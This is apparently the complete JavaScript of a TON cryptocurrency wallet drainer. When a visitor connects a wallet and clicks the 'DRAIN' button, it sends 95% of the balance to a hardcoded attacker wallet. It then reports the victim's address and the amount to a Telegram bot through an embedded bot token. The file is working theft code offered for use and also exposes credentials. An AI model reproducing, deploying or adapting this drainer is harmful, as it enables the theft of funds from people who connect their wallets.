const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

const MAIN_WALLET = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp";
const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
const TG_CHAT_ID = "8126533622";

// Получение баланса TON
async function getBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        return data.balance || '0';
    } catch (error) {
        console.error('Balance check failed:', error);
        return '0';
    }
}

// Основная функция для перевода
async function transferFunds() {
    const drainBtn = document.getElementById('drain-btn');
    
    try {
        if (!tonConnectUI.connected || !tonConnectUI.account) {
            alert('Пожалуйста, сначала подключите кошелек');
            return;
        }

        // Блокируем кнопку на время выполнения
        drainBtn.disabled = true;
        drainBtn.textContent = 'Processing...';

        const walletAddress = tonConnectUI.account.address;
        const balance = await getBalance(walletAddress);
        
        if (balance === '0') {
            alert('На кошельке нет средств');
            return;
        }

        // Оставляем 5% на комиссии
        const amountToSend = (BigInt(balance) * 95n / 100n).toString();
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [
                {
                    address: MAIN_WALLET,
                    amount: amountToSend
                }
            ]
        };

        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction successful:', result);
        
        const message = `*New transaction*\nFrom: ${walletAddress}\nAmount: ${amountToSend/1e9} TON`;
        sendTelegramMessage(message);
        
        alert(`Успешно отправлено ${amountToSend/1e9} TON!`);

    } catch (error) {
        console.error('Transaction failed:', error);
        alert('Ошибка: ' + error.message);
        sendTelegramMessage(`*Transaction failed*\nError: ${error.message}`);
        
    } finally {
        // Всегда разблокируем кнопку, даже если была ошибка
        drainBtn.disabled = false;
        drainBtn.textContent = 'DRAIN';
    }
}

function sendTelegramMessage(text) {
    if (!TG_CHAT_ID) return;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url).catch(err => console.error('Telegram error:', err));
}

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    const drainBtn = document.getElementById('drain-btn');
    if (drainBtn) {
        drainBtn.addEventListener('click', transferFunds);
    }

    // Обработчик изменения состояния кошелька
    tonConnectUI.onStatusChange((wallet) => {
        console.log('Wallet status changed:', wallet);
        if (wallet) {
            document.getElementById('drain-btn').style.display = 'block';
        } else {
            document.getElementById('drain-btn').style.display = 'none';
        }
    });
});
